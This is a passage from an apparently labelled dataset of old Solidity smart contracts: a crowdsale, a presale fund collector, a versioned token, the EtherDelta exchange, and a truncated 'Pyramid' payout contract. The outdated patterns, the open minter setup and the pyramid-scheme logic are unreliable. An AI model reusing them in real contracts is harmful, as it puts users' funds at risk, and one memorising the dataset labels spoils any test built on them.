FractionalERC20(_token);\r\r\n\r\r\n    setPricingStrategy(_pricingStrategy);\r\r\n\r\r\n    multisigWallet = _multisigWallet;\r\r\n    if(multisigWallet == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    if(_start == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    startsAt = _start;\r\r\n\r\r\n    if(_end == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    endsAt = _end;\r\r\n\r\r\n    \/\/ Don&#39;t mess the dates\r\r\n    if(startsAt >= endsAt) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Minimum funding goal can be zero\r\r\n    minimumFundingGoal = _minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Don&#39;t expect to just send in money and get tokens.\r\r\n   *\/\r\r\n  function() payable {\r\r\n    throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Make an investment.\r\r\n   *\r\r\n   * Crowdsale must be running for one to invest.\r\r\n   * We must have not pressed the emergency brake.\r\r\n   *\r\r\n   * @param receiver The Ethereum address who receives the tokens\r\r\n   * @param customerId (optional) UUID v4 to track the successful payments on the server side\r\r\n   *\r\r\n   *\/\r\r\n  function investInternal(address receiver, uint128 customerId) stopInEmergency private {\r\r\n\r\r\n    \/\/ Determine if it&#39;s a good time to accept investment from this participant\r\r\n    if(getState() == State.PreFunding) {\r\r\n      \/\/ Are we whitelisted for early deposit\r\r\n      if(!earlyParticipantWhitelist[receiver]) {\r\r\n        throw;\r\r\n      }\r\r\n    } else if(getState() == State.Funding) {\r\r\n      \/\/ Retail participants can only come in when the crowdsale is running\r\r\n      \/\/ pass\r\r\n    } else {\r\r\n      \/\/ Unwanted state\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    uint weiAmount = msg.value;\r\r\n    uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\r\r\n\r\r\n    if(tokenAmount == 0) {\r\r\n      \/\/ Dust transaction\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(investedAmountOf[receiver] == 0) {\r\r\n       \/\/ A new investor\r\r\n       investorCount++;\r\r\n    }\r\r\n\r\r\n    \/\/ Update investor\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    \/\/ Update totals\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    \/\/ Check that we did not bust the cap\r\r\n    if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Pocket the money\r\r\n    if(!multisigWallet.send(weiAmount)) throw;\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Preallocate tokens for the early investors.\r\r\n   *\r\r\n   * Preallocated tokens have been sold before the actual crowdsale opens.\r\r\n   * This function mints the tokens and moves the crowdsale needle.\r\r\n   *\r\r\n   * Investor count is not handled; it is assumed this goes for multiple investors\r\r\n   * and the token distribution happens outside the smart contract flow.\r\r\n   *\r\r\n   * No money is exchanged, as the crowdsale team already have received the payment.\r\r\n   *\r\r\n   * @param fullTokens tokens as full tokens - decimal places added internally\r\r\n   * @param weiPrice Price of a single full token in wei\r\r\n   *\r\r\n   *\/\r\r\n  function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\r\r\n\r\r\n    uint tokenAmount = fullTokens * 10**token.decimals();\r\r\n    uint weiAmount = weiPrice * fullTokens; \/\/ This can be also 0, we give out tokens for free\r\r\n\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n     bytes32 hash = sha256(addr);\r\r\n     if (ecrecover(hash, v, r, s) != signerAddress) throw;\r\r\n     if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n     investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Track who is the customer making the payment so we can send thank you email.\r\r\n   *\/\r\r\n  function investWithCustomerId(address addr, uint128 customerId) public payable {\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n    investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function invest(address addr) public payable {\r\r\n    if(requireCustomerId) throw; \/\/ Crowdsale needs to track partipants for thank you email\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    investInternal(addr, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer and clear his address.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n    investWithSignedAddress(msg.sender, customerId, v, r, s);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithCustomerId(uint128 customerId) public payable {\r\r\n    investWithCustomerId(msg.sender, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * The basic entry point to participate the crowdsale process.\r\r\n   *\r\r\n   * Pay for funding, get invested tokens back in the sender address.\r\r\n   *\/\r\r\n  function buy() public payable {\r\r\n    invest(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Finalize a succcesful crowdsale.\r\r\n   *\r\r\n   * The owner can triggre a call the contract that provides post-crowdsale actions, like releasing the tokens.\r\r\n   *\/\r\r\n  function finalize() public inState(State.Success) onlyOwner stopInEmergency {\r\r\n\r\r\n    \/\/ Already finalized\r\r\n    if(finalized) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Finalizing is optional. We only call it if we are given a finalizing agent.\r\r\n    if(address(finalizeAgent) != 0) {\r\r\n      finalizeAgent.finalizeCrowdsale();\r\r\n    }\r\r\n\r\r\n    finalized = true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set finalize agent.\r\r\n   *\r\r\n   * Design choice: no state restrictions on setting this, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\r\r\n    finalizeAgent = addr;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!finalizeAgent.isFinalizeAgent()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy do we need to have server-side customer ids for the investments.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireCustomerId(bool value) onlyOwner {\r\r\n    requireCustomerId = value;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy if all investors must be cleared on the server side first.\r\r\n   *\r\r\n   * This is e.g. for the accredited investor clearing.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\r\r\n    requiredSignedAddress = value;\r\r\n    signerAddress = _signerAddress;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow addresses to do early participation.\r\r\n   *\r\r\n   * TODO: Fix spelling error in the name\r\r\n   *\/\r\r\n  function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\r\r\n    earlyParticipantWhitelist[addr] = status;\r\r\n    Whitelisted(addr, status);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow crowdsale owner to close early or extend the crowdsale.\r\r\n   *\r\r\n   * This is useful e.g. for a manual soft cap implementation:\r\r\n   * - after X amount is reached determine manual closing\r\r\n   *\r\r\n   * This may put the crowdsale to an invalid state,\r\r\n   * but we trust owners know what they are doing.\r\r\n   *\r\r\n   *\/\r\r\n  function setEndsAt(uint time) onlyOwner {\r\r\n\r\r\n    if(now > time) {\r\r\n      throw; \/\/ Don&#39;t change past\r\r\n    }\r\r\n\r\r\n    endsAt = time;\r\r\n    EndsAtChanged(endsAt);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set pricing strategy.\r\r\n   *\r\r\n   * Design choice: no state restrictions on the set, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\r\r\n    pricingStrategy = _pricingStrategy;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!pricingStrategy.isPricingStrategy()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow load refunds back on the contract for the refunding.\r\r\n   *\r\r\n   * The team can transfer the funds back on the smart contract in the case the minimum goal was not reached..\r\r\n   *\/\r\r\n  function loadRefund() public payable inState(State.Failure) {\r\r\n    if(msg.value == 0) throw;\r\r\n    loadedRefund = loadedRefund.plus(msg.value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Investors can claim refund.\r\r\n   *\/\r\r\n  function refund() public inState(State.Refunding) {\r\r\n    uint256 weiValue = investedAmountOf[msg.sender];\r\r\n    if (weiValue == 0) throw;\r\r\n    investedAmountOf[msg.sender] = 0;\r\r\n    weiRefunded = weiRefunded.plus(weiValue);\r\r\n    Refund(msg.sender, weiValue);\r\r\n    if (!msg.sender.send(weiValue)) throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @return true if the crowdsale has raised enough money to be a succes\r\r\n   *\/\r\r\n  function isMinimumGoalReached() public constant returns (bool reached) {\r\r\n    return weiRaised >= minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isFinalizerSane() public constant returns (bool sane) {\r\r\n    return finalizeAgent.isSane();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isPricingSane() public constant returns (bool sane) {\r\r\n    return pricingStrategy.isSane(address(this));\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Crowdfund state machine management.\r\r\n   *\r\r\n   * We make it a function and do not assign the result to a variable, so there is no chance of the variable being stale.\r\r\n   *\/\r\r\n  function getState() public constant returns (State) {\r\r\n    if(finalized) return State.Finalized;\r\r\n    else if (address(finalizeAgent) == 0) return State.Preparing;\r\r\n    else if (!finalizeAgent.isSane()) return State.Preparing;\r\r\n    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\r\r\n    else if (block.timestamp < startsAt) return State.PreFunding;\r\r\n    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\r\r\n    else if (isMinimumGoalReached()) return State.Success;\r\r\n    else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\r\r\n    else return State.Failure;\r\r\n  }\r\r\n\r\r\n  \/** This is for manual testing of multisig wallet interaction *\/\r\r\n  function setOwnerTestValue(uint val) onlyOwner {\r\r\n    ownerTestValue = val;\r\r\n  }\r\r\n\r\r\n  \/** Interface marker. *\/\r\r\n  function isCrowdsale() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Modifiers\r\r\n  \/\/\r\r\n\r\r\n  \/** Modified allowing execution only if the crowdsale is currently running.  *\/\r\r\n  modifier inState(State state) {\r\r\n    if(getState() != state) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Abstract functions\r\r\n  \/\/\r\r\n\r\r\n  \/**\r\r\n   * Check if the current invested breaks our cap rules.\r\r\n   *\r\r\n   *\r\r\n   * The child contract must define their own cap setting rules.\r\r\n   * We allow a lot of flexibility through different capping strategies (ETH, token count)\r\r\n   * Called from invest().\r\r\n   *\r\r\n   * @param weiAmount The amount of wei the investor tries to invest in the current transaction\r\r\n   * @param tokenAmount The amount of tokens we try to give to the investor in the current transaction\r\r\n   * @param weiRaisedTotal What would be our total raised balance after this transaction\r\r\n   * @param tokensSoldTotal What would be our total sold tokens count after this transaction\r\r\n   *\r\r\n   * @return true if taking this investment would break our cap rules\r\r\n   *\/\r\r\n  function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\r\r\n\r\r\n  \/**\r\r\n   * Check if the current crowdsale is full and we can no longer sell any tokens.\r\r\n   *\/\r\r\n  function isCrowdsaleFull() public constant returns (bool);\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens or transfer issued tokens to the investor depending on the cap model.\r\r\n   *\/\r\r\n  function assignTokens(address receiver, uint tokenAmount) private;\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Collect funds from presale investors to be send to the crowdsale smart contract later.\r\r\n *\r\r\n * - Collect funds from pre-sale investors\r\r\n * - Send funds to the crowdsale when it opens\r\r\n * - Allow owner to set the crowdsale\r\r\n * - Have refund after X days as a safety hatch if the crowdsale doesn&#39;t materilize\r\r\n *\r\r\n *\/\r\r\ncontract PresaleFundCollector is Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/** How many investors when can carry per a single contract *\/\r\r\n  uint public MAX_INVESTORS = 32;\r\r\n\r\r\n  \/** How many investors we have now *\/\r\r\n  uint public investorCount;\r\r\n\r\r\n  \/** Who are our investors (iterable) *\/\r\r\n  address[] public investors;\r\r\n\r\r\n  \/** How much they have invested *\/\r\r\n  mapping(address => uint) public balances;\r\r\n\r\r\n  \/** When our refund freeze is over (UNIT timestamp) *\/\r\r\n  uint public freezeEndsAt;\r\r\n\r\r\n  \/** What is the minimum buy in *\/\r\r\n  uint public weiMinimumLimit;\r\r\n\r\r\n  \/** Have we begun to move funds *\/\r\r\n  bool public moving;\r\r\n\r\r\n  \/** Our ICO contract where we will move the funds *\/\r\r\n  Crowdsale public crowdsale;\r\r\n\r\r\n  event Invested(address investor, uint value);\r\r\n  event Refunded(address investor, uint value);\r\r\n\r\r\n  \/**\r\r\n   * Create presale contract where lock up period is given days\r\r\n   *\/\r\r\n  function PresaleFundCollector(address _owner, uint _freezeEndsAt, uint _weiMinimumLimit) {\r\r\n\r\r\n    owner = _owner;\r\r\n\r\r\n    \/\/ Give argument\r\r\n    if(_freezeEndsAt == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Give argument\r\r\n    if(_weiMinimumLimit == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    weiMinimumLimit = _weiMinimumLimit;\r\r\n    freezeEndsAt = _freezeEndsAt;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Participate to a presale.\r\r\n   *\/\r\r\n  function invest() public payable {\r\r\n\r\r\n    \/\/ Cannot invest anymore through crowdsale when moving has begun\r\r\n    if(moving) throw;\r\r\n\r\r\n    address investor = msg.sender;\r\r\n\r\r\n    bool existing = balances[investor] > 0;\r\r\n\r\r\n    balances[investor] = balances[investor].plus(msg.value);\r\r\n\r\r\n    \/\/ Need to fulfill minimum limit\r\r\n    if(balances[investor] < weiMinimumLimit) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ This is a new investor\r\r\n    if(!existing) {\r\r\n\r\r\n      \/\/ Limit number of investors to prevent too long loops\r\r\n      if(investorCount >= MAX_INVESTORS) throw;\r\r\n\r\r\n      investors.push(investor);\r\r\n      investorCount++;\r\r\n    }\r\r\n\r\r\n    Invested(investor, msg.value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Load funds to the crowdsale for a single investor.\r\r\n   *\/\r\r\n  function parcipateCrowdsaleInvestor(address investor) public {\r\r\n\r\r\n    \/\/ Crowdsale not yet set\r\r\n    if(address(crowdsale) == 0) throw;\r\r\n\r\r\n    moving = true;\r\r\n\r\r\n    if(balances[investor] > 0) {\r\r\n      uint amount = balances[investor];\r\r\n      delete balances[investor];\r\r\n      crowdsale.invest.value(amount)(investor);\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Load funds to the crowdsale for all investor.\r\r\n   *\r\r\n   *\/\r\r\n  function parcipateCrowdsaleAll() public {\r\r\n\r\r\n    \/\/ We might hit a max gas limit in this loop,\r\r\n    \/\/ and in this case you can simply call parcipateCrowdsaleInvestor() for all investors\r\r\n    for(uint i=0; i<investors.length; i++) {\r\r\n       parcipateCrowdsaleInvestor(investors[i]);\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * ICO never happened. Allow refund.\r\r\n   *\/\r\r\n  function refund() {\r\r\n\r\r\n    \/\/ Trying to ask refund too soon\r\r\n    if(now < freezeEndsAt) throw;\r\r\n\r\r\n    \/\/ We have started to move funds\r\r\n    moving = true;\r\r\n\r\r\n    address investor = msg.sender;\r\r\n    if(balances[investor] == 0) throw;\r\r\n    uint amount = balances[investor];\r\r\n    delete balances[investor];\r\r\n    if(!investor.send(amount)) throw;\r\r\n    Refunded(investor, amount);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set the target crowdsale where we will move presale funds when the crowdsale opens.\r\r\n   *\/\r\r\n  function setCrowdsale(Crowdsale _crowdsale) public onlyOwner {\r\r\n     crowdsale = _crowdsale;\r\r\n  }\r\r\n\r\r\n  \/** Explicitly call function from your wallet. *\/\r\r\n  function() payable {\r\r\n    throw;\r\r\n  }\r\r\n}","label":0}
{"code":"contract Token {\r\r\n\r\r\n    \/\/\/ @return total amount of tokens\r\r\n    function totalSupply() constant returns (uint256 supply) {}\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of wei to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n\r\r\n}\r\r\n\r\r\ncontract StandardToken is Token {\r\r\n\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/Default assumes totalSupply can&#39;t be over max (2^256 - 1).\r\r\n        \/\/If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn&#39;t wrap.\r\r\n        \/\/Replace the if with this one instead.\r\r\n        if (balancesVersions[version].balances[msg.sender] >= _value && balancesVersions[version].balances[_to] + _value > balancesVersions[version].balances[_to]) {\r\r\n        \/\/if (balancesVersions[version].balances[msg.sender] >= _value && _value > 0) {\r\r\n            balancesVersions[version].balances[msg.sender] -= _value;\r\r\n            balancesVersions[version].balances[_to] += _value;\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/same as above. Replace this line with the following if you want to protect against wrapping uints.\r\r\n        if (balancesVersions[version].balances[_from] >= _value && allowedVersions[version].allowed[_from][msg.sender] >= _value && balancesVersions[version].balances[_to] + _value > balancesVersions[version].balances[_to]) {\r\r\n        \/\/if (balancesVersions[version].balances[_from] >= _value && allowedVersions[version].allowed[_from][msg.sender] >= _value && _value > 0) {\r\r\n            balancesVersions[version].balances[_to] += _value;\r\r\n            balancesVersions[version].balances[_from] -= _value;\r\r\n            allowedVersions[version].allowed[_from][msg.sender] -= _value;\r\r\n            Transfer(_from, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balancesVersions[version].balances[_owner];\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\r\n        allowedVersions[version].allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n      return allowedVersions[version].allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \/\/this is so we can reset the balances while keeping track of old versions\r\r\n    uint public version = 0;\r\r\n\r\r\n    struct BalanceStruct {\r\r\n      mapping(address => uint256) balances;\r\r\n    }\r\r\n    mapping(uint => BalanceStruct) balancesVersions;\r\r\n\r\r\n    struct AllowedStruct {\r\r\n      mapping (address => mapping (address => uint256)) allowed;\r\r\n    }\r\r\n    mapping(uint => AllowedStruct) allowedVersions;\r\r\n\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n}\r\r\n\r\r\ncontract ReserveToken is StandardToken {\r\r\n    address public minter;\r\r\n    function setMinter() {\r\r\n        if (minter==0x0000000000000000000000000000000000000000) {\r\r\n            minter = msg.sender;\r\r\n        }\r\r\n    }\r\r\n    modifier onlyMinter { if (msg.sender == minter) _ }\r\r\n    function create(address account, uint amount) onlyMinter {\r\r\n        balancesVersions[version].balances[account] += amount;\r\r\n        totalSupply += amount;\r\r\n    }\r\r\n    function destroy(address account, uint amount) onlyMinter {\r\r\n        if (balancesVersions[version].balances[account] < amount) throw;\r\r\n        balancesVersions[version].balances[account] -= amount;\r\r\n        totalSupply -= amount;\r\r\n    }\r\r\n    function reset() onlyMinter {\r\r\n        version++;\r\r\n        totalSupply = 0;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract EtherDelta {\r\r\n\r\r\n  mapping (address => mapping (address => uint)) tokens; \/\/mapping of token addresses to mapping of account balances\r\r\n  \/\/ether balances are held in the token=0 account\r\r\n  mapping (bytes32 => uint) orderFills;\r\r\n  address public feeAccount;\r\r\n  uint public feeMake; \/\/percentage times (1 ether)\r\r\n  uint public feeTake; \/\/percentage times (1 ether)\r\r\n\r\r\n  event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\r\r\n  event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give);\r\r\n  event Deposit(address token, address user, uint amount, uint balance);\r\r\n  event Withdraw(address token, address user, uint amount, uint balance);\r\r\n\r\r\n  function EtherDelta(address feeAccount_, uint feeMake_, uint feeTake_) {\r\r\n    feeAccount = feeAccount_;\r\r\n    feeMake = feeMake_;\r\r\n    feeTake = feeTake_;\r\r\n  }\r\r\n\r\r\n  function() {\r\r\n    throw;\r\r\n  }\r\r\n\r\r\n  function deposit() {\r\r\n    tokens[0][msg.sender] += msg.value;\r\r\n    Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]);\r\r\n  }\r\r\n\r\r\n  function withdraw(uint amount) {\r\r\n    if (msg.value>0) throw;\r\r\n    if (tokens[0][msg.sender] < amount) throw;\r\r\n    tokens[0][msg.sender] -= amount;\r\r\n    if (!msg.sender.call.value(amount)()) throw;\r\r\n    Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);\r\r\n  }\r\r\n\r\r\n  function depositToken(address token, uint amount) {\r\r\n    \/\/remember to call Token(address).approve(this, amount) or this contract will not be able to do the transfer on your behalf.\r\r\n    if (msg.value>0 || token==0) throw;\r\r\n    if (!Token(token).transferFrom(msg.sender, this, amount)) throw;\r\r\n    tokens[token][msg.sender] += amount;\r\r\n    Deposit(token, msg.sender, amount, tokens[token][msg.sender]);\r\r\n  }\r\r\n\r\r\n  function withdrawToken(address token, uint amount) {\r\r\n    if (msg.value>0 || token==0) throw;\r\r\n    if (tokens[token][msg.sender] < amount) throw;\r\r\n    tokens[token][msg.sender] -= amount;\r\r\n    if (!Token(token).transfer(msg.sender, amount)) throw;\r\r\n    Withdraw(token, msg.sender, amount, tokens[token][msg.sender]);\r\r\n  }\r\r\n\r\r\n  function balanceOf(address token, address user) constant returns (uint) {\r\r\n    return tokens[token][user];\r\r\n  }\r\r\n\r\r\n  function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) {\r\r\n    if (msg.value>0) throw;\r\r\n    Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s);\r\r\n  }\r\r\n\r\r\n  function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) {\r\r\n    \/\/amount is in amountGet terms\r\r\n    if (msg.value>0) throw;\r\r\n    bytes32 hash = sha256(tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\r\r\n    if (!(\r\r\n      ecrecover(hash,v,r,s) == user &&\r\r\n      block.number <= expires &&\r\r\n      orderFills[hash] + amount <= amountGet &&\r\r\n      tokens[tokenGet][msg.sender] >= amount &&\r\r\n      tokens[tokenGive][user] >= amountGive * amount \/ amountGet\r\r\n    )) throw;\r\r\n    tokens[tokenGet][msg.sender] -= amount;\r\r\n    tokens[tokenGet][user] += amount * ((1 ether) - feeMake) \/ (1 ether);\r\r\n    tokens[tokenGet][feeAccount] += amount * feeMake \/ (1 ether);\r\r\n    tokens[tokenGive][user] -= amountGive * amount \/ amountGet;\r\r\n    tokens[tokenGive][msg.sender] += ((1 ether) - feeTake) * amountGive * amount \/ amountGet \/ (1 ether);\r\r\n    tokens[tokenGive][feeAccount] += feeTake * amountGive * amount \/ amountGet \/ (1 ether);\r\r\n    orderFills[hash] += amount;\r\r\n    Trade(tokenGet, amount, tokenGive, amountGive * amount \/ amountGet, user, msg.sender);\r\r\n  }\r\r\n\r\r\n  function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) {\r\r\n    if (!(\r\r\n      tokens[tokenGet][sender] >= amount &&\r\r\n      availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount\r\r\n    )) return false;\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) {\r\r\n    bytes32 hash = sha256(tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\r\r\n    if (!(\r\r\n      ecrecover(hash,v,r,s) == user &&\r\r\n      block.number <= expires\r\r\n    )) return 0;\r\r\n    uint available1 = amountGet - orderFills[hash];\r\r\n    uint available2 = tokens[tokenGive][user] * amountGet \/ amountGive;\r\r\n    if (available1<available2) return available1;\r\r\n    return available2;\r\r\n  }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.0;\r\r\n\r\r\ncontract Pyramid {\r\r\n    address master;\r\r\n\r\r\n    address[] memberQueue;\r\r\n    uint queueFront;\r\r\n\r\r\n    event Joined(address indexed _member, uint _entries, uint _paybackStartNum);\r\r\n\r\r\n    modifier onlymaster { if (msg.sender == master) _; }\r\r\n\r\r\n    function Pyramid() {\r\r\n        master = msg.sender;\r\r\n        memberQueue.push(master);\r\r\n        queueFront = 0;\r\r\n    }\r\r\n\r\r\n    \/\/ fallback function, wont work to call join here bc we will run out of gas (2300 gas for send())\r\r\n    function(){}\r\r\n\r\r\n    \/\/ users are allowed to join with .1 - 5 ethereum\r\r\n    function join() payable {\r\r\n        require(msg.value >= 100 finney);\r\r\n\r\r\n        uint entries = msg.value \/ 100 finney;\r\r\n        entries = entries > 50 ? 50 : entries; \/\/ cap at 5 ethereum\r\r\n\r\r\n        for (uint i = 0; i < entries; i++) {\r\r\n            